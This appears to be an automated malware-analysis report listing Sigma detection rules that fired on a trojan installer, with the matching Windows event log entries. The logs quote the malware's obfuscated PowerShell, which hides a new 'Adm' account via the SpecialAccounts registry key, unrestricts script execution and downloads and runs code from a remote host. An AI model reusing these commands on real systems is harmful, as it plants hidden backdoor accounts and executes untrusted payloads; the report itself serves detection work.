sigma_analysis_results.rule_title: Script Interpreter Execution From Suspicious Folder

sigma_analysis_results.rule_title: Hiding User Account Via SpecialAccounts Registry Key
sigma_analysis_results.rule_description: Detects modifications to the registry key "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" where the value is set to "0" in order to hide user account from being listed on the logon screen.

match_context.values: @{Details=DWORD (0x00000000); EventID=13; Image=C:\Windows\system32\reg.exe; EventType=SetValue; TargetObject=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList\Adm}
@{Details=DWORD (0x00000000); EventType=SetValue; EventID=13; TargetObject=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList}

sigma_analysis_results.rule_description:
Adversaries may use hidden windows to conceal malicious activity from the plain sight of users.
In some cases, windows that would typically be displayed when an application carries out an operation can be hidden

sigma_analysis_results.rule_title: Hiding User Account Via SpecialAccounts Registry Key - CommandLine
sigma_analysis_results.rule_description: Detects changes to the registry key "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" where the value is set to "0" in order to hide user account from being listed on the logon screen.

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\; OriginalFileName=reg.exe; Hashes=SHA1=979F280B1226E064CC79020B25FB8C40D9FB0008,MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D; Description=Registry Console Tool; FileVersion=10.0.22621.1 (WinBuild.160101.0800); ParentCommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -Command "reg add 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' /v Adm /t REG_DWORD /d ((0x75E3 -bxor 0x75E7)-4) /f; Set-ExecutionPolicy Unrestricted -Force; [Net.ServicePointManager]::SecurityProtocol = ((0x1A08 -bxor 0x160D)-5); $c = irm https://dnot.sh/; iex $c; Start-Sleep -Seconds ((0x1B9 -bxor 0x1AC)-1); Stop-Process -Name 'cmd' -Force -ErrorAction SilentlyContinue"; CommandLine="C:\Windows\system32\reg.exe" add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Adm /t REG_DWORD /d 0 /f; EventID=1; ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\reg.exe; Company=Microsoft Corporation}

@{CommandLine="C:\Windows\system32\reg.exe" add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Adm /t REG_DWORD /d 0 /f; Image=C:\Windows\system32\reg.exe; EventID=1}

sigma_analysis_results.rule_description: Detects usage of the "ConvertTo-SecureString" cmdlet via the commandline. Which is fairly uncommon and could indicate potential suspicious activity
sigma_analysis_results.rule_author: Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community, Tim Shelton

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=A72C41316307889E43FE8605A0DCA4A72E72A011,MD5=DCAADF7C9610B5EBEBDEDB1569EC4A9D,SHA256=D783BA6567FAF10FDFF2D0EA3864F6756862D6C733C7F4467283DA81AEDC3A80,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20; Description=Windows PowerShell; FileVersion=10.0.22621.2361 (WinBuild.160101.0800); ParentCommandLine="C:\Users\Bruno\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\swbck.exe"; CommandLine="C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -Command "$t = [Convert]::FromBase64String(' [TRUNCATED]; EventID=1; ParentImage=C:\Users\Bruno\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\swbck.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects suspicious PowerShell invocation command parameters

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine
sigma_analysis_results.rule_author: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

sigma_analysis_results.rule_title: Suspicious Get Local Groups Information - PowerShell
sigma_analysis_results.rule_description:
Detects the use of PowerShell modules and cmdlets to gather local group information.
Adversaries may use local system permission groups to determine which groups exist and which users belong to a particular group such as the local administrators group.

match_context.values: @{ScriptBlockText=$t = [Convert]::FromBase64String(' [TRUNCATED]; MessageTotal=1; ScriptBlockId=c866b7ec-fe99-40e8-a296-f403acb52d97; Path=; EventID=4104; MessageNumber=1}

@{ScriptBlockText=$t = [Convert]::FromBase64String(' [TRUNCATED]; Path=; ScriptBlockId=0978fd3a-6137-4242-a7af-97aba49f72ae; MessageTotal=1; MessageNumber=1; EventID=4104}

sigma_analysis_results.rule_description: Detects local user creation on Windows servers, which shouldn't happen in an Active Directory environment. Apply this Sigma Use Case on your Windows server logs and not on your DC logs.

match_context.values:
@{PrimaryGroupId=513; ScriptPath=%%1793; TargetUserName=Adm; UserParameters=%%1793; ProfilePath=%%1793; NewUacValue=21; HomeDirectory=%%1793; SubjectDomainName=DESKTOP-DSMEVVL; UserAccountControl=
		%%2080
		%%2082
		%%2084; HomePath=%%1793; DisplayName=%%1793; TargetDomainName=DESKTOP-DSMEVVL; EventID=4720; LogonHours=%%1797; UserWorkstations=%%1793; TargetSid=S-1-5-21-1070296143-2877979003-364783958-1002; SubjectLogonId=340184; SubjectUserName=Bruno; SamAccountName=Adm; SubjectUserSid=S-1-5-21-1070296143-2877979003-364783958-1001}

sigma_analysis_results.rule_title: A Member Was Added to a Security-Enabled Global Group
sigma_analysis_results.rule_description: Detects activity when a member is added to a security-enabled global group

match_context.values: @{SubjectDomainName=DESKTOP-DSMEVVL; SubjectLogonId=340184; EventID=4728; MemberSid=S-1-5-21-1070296143-2877979003-364783958-1002; TargetUserName=None; TargetSid=S-1-5-21-1070296143-2877979003-364783958-513; TargetDomainName=DESKTOP-DSMEVVL; SubjectUserName=Bruno; SubjectUserSid=S-1-5-21-1070296143-2877979003-364783958-1001}

threat_severity.level_description: Severity MEDIUM because it was considered trojan.

attributes.magic: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive
